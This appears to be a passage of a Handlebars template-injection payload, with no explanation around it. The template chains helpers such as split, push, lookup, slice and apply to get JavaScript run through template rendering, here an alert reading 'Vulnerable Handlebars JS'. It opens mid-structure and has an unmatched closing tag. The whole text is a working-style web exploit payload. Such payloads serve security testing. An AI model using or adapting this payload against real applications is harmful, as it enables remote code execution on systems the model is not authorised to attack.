{{#with split as |a|}}
        {{pop (push "alert('Vulnerable Handlebars JS');")}}
        {{#with (concat (lookup join (slice 0 1)))}}
            {{#each (slice 2 3)}}
                {{#with (apply 0 a)}}
                    {{.}}
                {{/with}}
            {{/each}}
        {{/with}}
    {{/with}}
{{/with}}
